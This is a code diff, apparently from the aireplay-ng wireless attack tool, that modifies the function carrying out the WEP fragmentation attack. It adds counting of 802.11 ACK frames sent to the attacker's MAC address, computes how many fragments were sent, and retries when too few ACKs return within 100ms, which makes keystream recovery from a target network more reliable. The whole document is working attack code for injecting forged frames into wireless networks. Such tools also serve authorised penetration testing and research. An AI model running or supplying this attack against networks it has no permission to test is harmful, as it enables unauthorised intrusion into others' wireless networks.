@@ -3227,6 +3227,8 @@ int do_attack_fragment()
     int length;
     int ret;
     int gotit;
+    int acksgot;
+    int packets;
 
     uchar *snap_header = (unsigned char*)"\xAA\xAA\x03\x00\x00\x00\x08\x00";
 
@@ -3307,6 +3309,11 @@ int do_attack_fragment()
                 arplen=63;
             }
 
+            acksgot=0;
+            packets=(arplen-24)/(prga_len-4);
+            if( (arplen-24)%(prga_len-4) != 0 )
+                packets++;
+
             PCT; printf("Sending fragmented packet\n");
             send_fragments(h80211, arplen, iv, prga, prga_len-4);
 //            //Plus an ACK
@@ -3318,6 +3325,15 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
+                    {
+                        acksgot++;
+                    }
+                    continue;
+                }
 
                 if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
@@ -3356,7 +3372,14 @@ int do_attack_fragment()
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = RETRY;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                 {
                     PCT; printf("No answer, repeating...\n");
                     round++;
@@ -3377,12 +3400,12 @@ int do_attack_fragment()
         if (caplen == 68)
         {
             //Thats the ARP packet!
-            PCT; printf("Thats our ARP packet!\n");
+//             PCT; printf("Thats our ARP packet!\n");
         }
         if (caplen == 71)
         {
             //Thats the LLC NULL packet!
-            PCT; printf("Thats our LLC Null packet!\n");
+//             PCT; printf("Thats our LLC Null packet!\n");
             memset(h80211+24, '\x00', 39);
         }
 
@@ -3429,6 +3452,11 @@ int do_attack_fragment()
                 arplen+=32;
             }
 
+            acksgot=0;
+            packets=(arplen-24)/(32);
+            if( (arplen-24)%(32) != 0 )
+                packets++;
+
             send_fragments(h80211, arplen, iv, prga, 32);
 //            //Plus an ACK
 //            send_packet(ack, 10);
@@ -3439,6 +3467,13 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
+                        acksgot++;
+                    continue;
+                }
 
                 if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
@@ -3477,7 +3512,14 @@ int do_attack_fragment()
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = RETRY;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                 {
                     PCT; printf("No answer, repeating...\n");
                     round++;
@@ -3498,12 +3540,12 @@ int do_attack_fragment()
         if (caplen == 416)
         {
             //Thats the ARP packet!
-            PCT; printf("Thats our ARP packet!\n");
+//             PCT; printf("Thats our ARP packet!\n");
         }
         if (caplen == 448)
         {
             //Thats the LLC NULL packet!
-            PCT; printf("Thats our LLC Null packet!\n");
+//             PCT; printf("Thats our LLC Null packet!\n");
             memset(h80211+24, '\x00', 416);
         }
 
@@ -3528,6 +3570,11 @@ int do_attack_fragment()
                 arplen+=32;
             }
 
+            acksgot=0;
+            packets=(arplen-24)/(300);
+            if( (arplen-24)%(300) != 0 )
+                packets++;
+
             send_fragments(h80211, arplen, iv, prga, 300);
 //            //Plus an ACK
 //            send_packet(ack, 10);
@@ -3538,6 +3585,13 @@ int do_attack_fragment()
             while (!gotit)  //waiting for relayed packet
             {
                 caplen = read_packet(packet, sizeof(packet), NULL);
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
+                        acksgot++;
+                    continue;
+                }
 
                 if (packet[0] == 0x08 && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                 {
@@ -3576,7 +3630,14 @@ int do_attack_fragment()
                 }
 
                 gettimeofday( &tv2, NULL );
-                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 500ms for an answer
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = RETRY;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                 {
                     PCT; printf("No answer, repeating...\n");
                     round++;
@@ -3609,12 +3670,12 @@ int do_attack_fragment()
         if (caplen == length+8+24)
         {
             //Thats the ARP packet!
-            PCT; printf("Thats our ARP packet!\n");
+//             PCT; printf("Thats our ARP packet!\n");
         }
         if (caplen == length+40)
         {
             //Thats the LLC NULL packet!
-            PCT; printf("Thats our LLC Null packet!\n");
+//             PCT; printf("Thats our LLC Null packet!\n");
             memset(h80211+24, '\x00', length+8);
         }
 
